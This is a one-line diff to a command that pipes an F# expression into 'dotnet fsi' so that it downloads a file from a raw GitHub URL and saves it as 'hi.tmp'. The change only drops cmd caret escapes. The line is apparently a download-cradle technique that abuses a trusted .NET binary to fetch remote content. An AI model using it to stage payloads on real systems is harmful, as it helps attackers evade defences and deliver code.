@@ -1,1 +1,1 @@
-echo System^.IO.File.WriteAllText("hi.tmp", (new System^.Net.WebClient()).DownloadString("https://raw.githubusercontent.com/u0buzz/psTest/main/calc"));; | dotnet fsi
+echo System.IO.File.WriteAllText("hi.tmp", (new System.Net.WebClient()).DownloadString("https://raw.githubusercontent.com/u0buzz/psTest/main/calc"));; | dotnet fsi
